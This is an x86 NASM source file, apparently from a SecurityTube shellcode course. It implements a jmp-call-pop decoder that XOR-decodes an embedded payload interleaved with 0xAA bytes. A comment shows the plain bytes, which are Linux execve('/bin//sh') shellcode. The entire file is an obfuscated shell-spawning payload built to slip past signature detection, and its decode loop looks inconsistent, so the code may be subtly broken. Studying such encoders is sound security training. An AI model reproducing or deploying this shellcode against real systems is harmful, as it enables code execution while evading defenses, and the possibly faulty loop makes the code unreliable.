; Filename: insertion-decoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	mov al, 1
	xor ebx, ebx

decode: 
	mov cl, byte [esi]
	xor cl, 0xaa
	mov byte [edi], cl
	
	mov bl, byte [esi + eax]
	xor bl, 0xaa
	jnz short EncodedShellcode
	mov cl, byte [esi + eax + 1]
	mov byte [edi+1], cl
	inc edi
	inc esi
	add al, 1
	jmp short decode	

	;+++++++++++++++++++++++++++++++++++++++++++NOW WE NEED TO MAKE OUR PYTHON ENCODER ADD 0xAA IN BETWEEN BYTES____________________________________________________________________________________

call_shellcode:

	call decoder
	EncodedShellcode: db 0x9b,0xaa,0x6a,0xaa,0xfa,0xaa,0xc2,0xaa,0x85,0xaa,0x85,0xaa,0xd9,0xaa,0xc2,0xaa,0xc2,0xaa,0x85,0xaa,0xc8,0xaa,0xc3,0xaa,0xc4,0xaa,0x23,0xaa,0x49,0xaa,0xfa,0xaa,0x23,0xaa,0x48,0xaa,0xf9,0xaa,0x23,0xaa,0x4b,0xaa,0x1a,0xaa,0xa1,0xaa,0x67,0xaa,0x2a,0xaa,0xbb,0xbb
	;0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb





